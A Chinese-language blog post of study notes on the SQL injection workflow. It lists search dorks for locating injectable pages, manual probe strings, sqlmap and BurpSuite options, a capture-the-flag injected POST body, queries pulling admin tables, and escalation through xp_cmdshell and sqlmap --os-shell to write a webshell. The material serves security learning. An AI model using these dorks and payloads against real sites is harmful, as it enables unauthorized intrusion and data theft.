---
layout: post
title: "1.1.1-SQL注入-SQL注入基础-SQL注入流程"
date: 2018-06-11
category: web安全
tags: sql注入 
---

### SQL注入流程
#### 01 寻找SQL注入点
##### 寻找SQL注入点

无特定目标：  
inurl:.php?id=  

有特定目标：  
inurl:.php?id=site:target.com 
// jsp sid   

工具爬取：  
spider,对搜索引擎和目标网站的链接进行爬取  

**注入识别**  
手工简单识别：  
	
	'
	and 1=1 / and 1=2
	and '1'='1 / and '1'='2 
	and 1 like 1 / and 1 like 2

工具识别：  
	
	sqlmap -m filename (filename中保存检测目标)
	sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
 
**高级识别：**  
扩展识别广度和深度：  
	
	SqlMap --level 增加测试级别，对header中相关参数也进行测试
	sqlmap -r filename (filename中为网站请求数据)

利用工具提高识别效率：
	
	BurpSuite + SqlMap
	BurpSuite拦截所有浏览器访问提交的数据
	BurpSuite扩展插件，直接调用SqlMap进行测试

一些Tips：  

可以在参数后键入“*” 来确定想要测试的参数  
可能出现注入的点：新闻、登录、搜索、留言... ...  
站在开发的角度去寻找  


---
	
	python sqlmap.py -r 1.txt

burp sqlmap 扩展  
Burp-> Extender->BApp Store -> SQLiPy Sqlmap  

**代码审计：**

搜索关键代码和函数  
梳理业务流程  

强网杯WEB “python is the best language”  

	http://test.com/register  
	POST:  

	username=test&email=t@t.com&password=123&password2=123&submit=Register  
	username=test&email=t@t.com' and '1' = '1&password=123&password2=123&submit=Register  



#### 02 SQL注入流程

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png)

数据获取
	
	web.mdb
	
	select [*] from admin
	select [*] from system
	
	select [username] from system
	select [name] from system


![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png)

提权
	
	xp.cmdshell
	
	--os-shell // 执行系统命令 写webshell到网站目录
	
	


